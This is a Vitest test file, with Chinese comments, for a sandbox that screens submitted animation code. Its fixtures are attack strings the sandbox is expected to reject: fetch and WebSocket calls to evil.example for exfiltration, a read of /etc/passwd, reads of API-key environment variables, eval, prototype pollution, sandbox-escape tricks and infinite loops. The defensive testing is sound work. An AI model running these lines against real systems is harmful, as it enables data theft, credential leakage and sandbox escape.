import { describe, expect, it } from 'vitest';
import { analyzeMotionCode } from './analysis.js';
import { runMotionSandbox, DEFAULT_SANDBOX_LIMITS } from './sandbox.js';

/**
 * P07-01 验收（REQ-11-03 MUST 十条 → 本测试覆盖的攻击 fixture）：
 * - **网络**：fetch / XMLHttpRequest / WebSocket / net 模块 → 静态拒绝；
 * - **越权文件**：fs 读取 / node:fs → 静态拒绝；
 * - **动态依赖**：require / import / 动态 import → 静态拒绝；
 * - **无限循环**：while(true) → 隔离子进程被硬超时 kill（TIMEOUT，宿主不受影响）；
 * - **Secret/环境**：process.env → 静态拒绝；沙箱上下文无 process；
 * - **动态执行**：eval / new Function / vm → 静态拒绝 + vm 上下文 codeGeneration=false；
 * - **合法 Motion**：通过（评估 → 渲染 smoke → APPROVED）。
 *
 * 部署层（gVisor/容器网络）属 P08；V1 进程内隔离 = 白名单上下文 + 静态分析 + 超时强杀。
 */

const fixture = { props: { title: '开场', value: '5.25%' }, frame: 15, fps: 30, durationInFrames: 90, width: 1920, height: 1080 };

const GOOD_MOTION = `
const title = String(fixtureProps['title'] ?? 'Motion');
registerMotion({
  name: 'simple-motion',
  component: (props) => {
    const frame = useCurrentFrame();
    const opacity = interpolate(frame, [0, 30], [0, 1], { extrapolateRight: 'clamp' });
    return AbsoluteFill({ style: { opacity }, children: [
      React.createElement('div', { style: { fontSize: 64 }, 'data-role': 'motion-title' }, String(props['title'] ?? title)),
    ] });
  },
});
`;

describe('静态分析（第一道门）', () => {
  it('合法 Motion 通过静态分析', () => {
    expect(analyzeMotionCode(GOOD_MOTION).ok).toBe(true);
  });

  it('网络攻击 fixture：fetch / XHR / WebSocket / net 被拒', () => {
    for (const code of [
      "fetch('https://evil.example/exfil').then(() => {});",
      "const x = new XMLHttpRequest(); x.open('GET', 'https://evil.example');",
      "const ws = new WebSocket('wss://evil.example');",
      "import net from 'net';",
    ]) {
      const result = analyzeMotionCode(code);
      expect(result.ok, code).toBe(false);
    }
  });

  it('越权文件 fixture：fs 读取被拒', () => {
    for (const code of [
      "import { readFile } from 'fs';",
      "import { readFile } from 'node:fs/promises';",
      "const fs = require('fs'); fs.readFileSync('/etc/passwd');",
    ]) {
      const result = analyzeMotionCode(code);
      expect(result.ok, code).toBe(false);
    }
  });

  it('动态依赖 fixture：require / import / 动态 import 被拒', () => {
    for (const code of [
      "const evil = require('evil-package');",
      "import evil from 'evil-package';",
      "const mod = await import(someVariable);",
    ]) {
      const result = analyzeMotionCode(code);
      expect(result.ok, code).toBe(false);
    }
  });

  it('Secret/环境 与 动态执行 fixture：process.env / eval / new Function / vm 被拒', () => {
    for (const code of [
      "const key = process.env.ANCS_SECRET;",
      "const env = process.env['ELEVENLABS_API_KEY'];",
      "eval('1+1');",
      "const f = new Function('return 1'); f();",
      "import { runInContext } from 'vm';",
    ]) {
      const result = analyzeMotionCode(code);
      expect(result.ok, code).toBe(false);
    }
  });

  it('全局逃逸与原型污染 fixture：globalThis / __proto__ 被拒', () => {
    for (const code of [
      "globalThis.fetch('https://evil.example');",
      "const obj = {}; obj['__proto__']['x'] = 1;",
      "const c = {}['constructor']['constructor']('return 1')();",
    ]) {
      const result = analyzeMotionCode(code);
      expect(result.ok, code).toBe(false);
    }
  });
});

describe('沙箱执行（隔离子进程）', () => {
  it('合法 Motion：评估 → 渲染 smoke → APPROVED（含渲染产物）', async () => {
    const result = await runMotionSandbox({ code: GOOD_MOTION, fixture });
    expect(result.verdict).toBe('APPROVED');
    if (result.verdict === 'APPROVED') {
      expect(result.markupLength).toBeGreaterThan(20);
      expect(result.renderMs).toBeLessThan(2000);
    }
  });

  it('评估失败（未注册组件 / 运行时异常）→ REJECTED EVALUATION，不进入项目', async () => {
    const noRegister = await runMotionSandbox({ code: "const x = 1;", fixture });
    expect(noRegister).toMatchObject({ verdict: 'REJECTED', stage: 'EVALUATION' });

    const throws = await runMotionSandbox({ code: "throw new Error('boom');", fixture });
    // 跨 vm realm 的错误不是宿主 Error 实例 → 消息带 Error: 前缀（字符串化）
    expect(throws).toMatchObject({ verdict: 'REJECTED', stage: 'EVALUATION' });
    if (throws.verdict === 'REJECTED' && throws.stage === 'EVALUATION') expect(throws.message).toContain('boom');
  });

  it('vm 上下文逃逸 fixture：访问未注入全局 → REJECTED EVALUATION（无网络/无 process）', async () => {
    // 静态分析不命中（字符串拼接），但 vm 上下文没有这些全局 → 评估期失败
    const fetchEscape = await runMotionSandbox({
      code: "const g = this; const f = g['fe' + 'tch']; registerMotion({ component: () => AbsoluteFill({}) }); f('https://evil.example');",
      fixture,
    });
    // URL 字面量含 https 词法（NET_MODULE，偏宽防线上过松）或 this 逃逸在评估期失败——**任一防线拒绝即不放行**
    expect(fetchEscape.verdict).toBe('REJECTED');
    if (fetchEscape.verdict === 'REJECTED') expect(['STATIC_ANALYSIS', 'EVALUATION']).toContain(fetchEscape.stage);

    const processEscape = await runMotionSandbox({
      code: "const keys = Object.keys(globalThisLike || {}); registerMotion({ component: () => AbsoluteFill({}) });",
      fixture,
    });
    // globalThisLike 含 globalThis 词法 → 静态分析拒绝；若改写绕过词法 → 评估期 ReferenceError（上下文无未注入全局）
    expect(processEscape).toMatchObject({ verdict: 'REJECTED' });
    if (processEscape.verdict === 'REJECTED') expect(['STATIC_ANALYSIS', 'EVALUATION']).toContain(processEscape.stage);
  });

  it('无限循环 fixture：隔离子进程被硬超时 kill → TIMEOUT（宿主不受影响）', async () => {
    const started = Date.now();
    const result = await runMotionSandbox(
      { code: "let x = 0; while (true) { x += 1; }", fixture },
      { ...DEFAULT_SANDBOX_LIMITS, timeoutMs: 1500 },
    );
    const elapsed = Date.now() - started;
    expect(result.verdict).toBe('TIMEOUT');
    expect(elapsed).toBeLessThan(5000); // 超时后宿主继续工作（不随子进程挂死）
  });

  it('宿主在沙箱超时后仍可继续处理后续提交（无跨提交状态污染）', async () => {
    const timeoutCase = await runMotionSandbox(
      { code: "while (true) {}", fixture },
      { ...DEFAULT_SANDBOX_LIMITS, timeoutMs: 1200 },
    );
    expect(timeoutCase.verdict).toBe('TIMEOUT');
    const next = await runMotionSandbox({ code: GOOD_MOTION, fixture });
    expect(next.verdict).toBe('APPROVED');
  });
});
